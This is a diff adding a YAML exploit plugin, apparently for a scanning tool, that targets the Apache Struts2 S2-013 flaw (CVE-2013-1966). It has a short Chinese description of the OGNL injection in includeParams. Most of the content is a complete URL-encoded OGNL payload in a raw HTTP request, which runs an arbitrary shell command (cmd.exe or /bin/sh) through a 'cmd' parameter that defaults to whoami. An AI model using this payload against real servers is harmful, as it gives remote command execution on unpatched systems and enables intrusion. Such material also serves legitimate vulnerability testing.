@@ -1,0 +1,37 @@
+info:
+    app: Struts2
+    name: S2_013
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2013-05-23"
+    create_date: "2024-10-06 12:33:16"
+    update_date: "2024-10-06 12:33:16"
+    scope: Struts 2.0.0 - 2.3.14.1
+    description: |
+        Struts2 标签中 "<s:a>" 和 "<s:url>" 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：
+
+        1. none - 链接不包含请求的任意参数值（默认）
+        2. get - 链接只包含 GET 请求中的参数和其值
+        3. all - 链接包含 GET 和 POST 所有参数和其值
+
+        "<s:a>"用来显示一个超链接，当"includeParams=all"的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。
+    vul_id: CVE-2013-1966
+    detail: |
+        利用点在URI里
+        URL如http://192.168.111.129:8080/link.action
+    payload: |
+        GET /link.action?&a=%25%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23outstr%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23osname%3D%40java.lang.System%40getProperty(%22os.name%22)%2C%23list%3D%23osname.startsWith(%22Windows%22)%3Fnew%20java.lang.String%5B%5D%7B%22cmd.exe%22%2C%22%2Fc%22%2C%23req.getParameter(%22cmd%22)%7D%3Anew%20java.lang.String%5B%5D%7B%22%2Fbin%2Fsh%22%2C%22-c%22%2C%23req.getParameter(%22cmd%22)%7D%2C%23aa%3D(new%20java.lang.ProcessBuilder(%23list)).start()%2C%23bb%3D%23aa.getInputStream()%2C%23outstr.println(new%20java.lang.String(new%20org.apache.commons.io.IOUtils().toByteArray(%23bb)%2C%22iso-8859-1%22))%2C%23outstr.close())%7D&cmd=whoami HTTP/1.1
+        Host: 192.168.111.129:8080
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
